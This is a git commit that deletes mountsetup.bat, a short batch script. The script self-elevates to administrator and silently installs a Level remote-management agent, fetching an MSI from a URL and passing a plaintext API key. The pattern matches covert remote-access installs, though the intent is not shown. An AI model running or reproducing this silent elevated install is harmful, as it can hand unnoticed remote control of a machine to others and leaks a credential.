367f23dab4d742e4997ab02227a8ad8e9d1b6997
Dave13985 <strawdave38@gmail.com>
2026-09-19 14:46:15 -0700

    Delete mountsetup.bat

--- mountsetup.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-:: Self-elevate
-if not "%1"=="am_admin" (
-    powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'am_admin' -Verb RunAs"
-    exit /b
-)
-:: Install Level agent silently
-msiexec /i "https://downloads.level.io/level.msi" LEVEL_API_KEY=wSAJ5FFmU9VAbv4kCMFmRzZU /qn
